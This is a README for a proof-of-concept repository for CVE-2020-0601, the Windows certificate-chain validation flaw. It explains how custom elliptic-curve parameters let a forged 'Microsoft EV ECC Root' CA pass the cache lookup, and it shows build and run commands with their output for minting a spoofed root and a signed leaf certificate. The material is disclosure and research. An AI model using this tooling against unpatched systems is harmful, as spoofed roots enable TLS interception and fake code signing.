# CVE-2020-0601 proof of concept

A fun proof of concept to create your own root CA and signed certificate based
on the CVE-2020-0601 vulnerability in Windows 10. The basis for the issue is
the `CertGetCertificateChain()` method improperly validated root certificate
authorities. Since the search for a signing certificate within the trust store
can be expensive, Microsoft implemented a cache which used the public key of
the provided root certificate to determine if this certificate had previously
been loaded from the trust store. However, for elliptic curve certificates, the
SubjectPublicKeyInfo contains more than just a public key. Elliptic curve
certificates must reference the specific elliptic curve (or provide their own
custom elliptic curve parameters). The vulnerability occurs because the
elliptic curve parameters are not included in the cache lookup. We can take an
existing public key, choose a new private key, compute curve parameters which
make this combination valid, and create a root certificate that will pass
Microsoft's previously vulnerable cache lookup.

This repository demonstrates spoofing the "Microsoft EV ECC Root Certificate
Authority 2017" trusted root certificate and using this new root CA to sign a
leaf certificate.

![Proof of concept certificate shown in Internet Explorer.](assets/proof-of-concept.png)

## Build

```
docker build -t gringotts .
```

## Usage

```
$ docker run --rm -it -v "$(pwd):/host" -w /host gringotts
Modified generator:
04bb3de13398a18e1c0d1a2d77ae8cbb9ea358d8c5c075eac51e0c408a0367db2ba187f1ab2febd8859d4c12811563fae6056fef803bff43964ca15c63a28cdc1fdfd38dab9fac20e7a8fa1fae619e576ee5706423414a3c3f8c7e1a2d8adc9cd7
Serializing root.txt and self-sign root certificate
Writing ca/root.pem
Serializing root private key
Writing ca/root-key.pem
read EC key
writing EC key
Generating a RSA private key
...............................................+++++
.........................................................................................+++++
writing new private key to 'ssl/server-key.pem'
-----
Using configuration from /usr/lib/ssl/openssl.cnf
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number:
            7c:e6:11:18:1c:5a:14:3e:6f:f0:e2:85:ea:5f:c7:dc:50:a4:b9:b2
        Validity
            Not Before: Apr 30 00:00:00 2018 GMT
            Not After : Aug  1 00:00:00 2020 GMT
        Subject:
            countryName               = GB
            stateOrProvinceName       = Scotland
            localityName              = Highlands
            organizationName          = Gringotts
            organizationalUnitName    = Hogwarts Castle
            commonName                = hogwarts.lf.lc
        X509v3 extensions:
            X509v3 Subject Alternative Name:
                DNS:hogwarts.lf.lc
Certificate is to be certified until Aug  1 00:00:00 2020 GMT (184 days)

Write out database with 1 new entries
Data Base Updated
$ tree
.
├── ca
│   ├── root-key.pem
│   └── root.pem
└── ssl
    ├── server-bundle.pem
    ├── server-key.pem
    └── server.pem
```

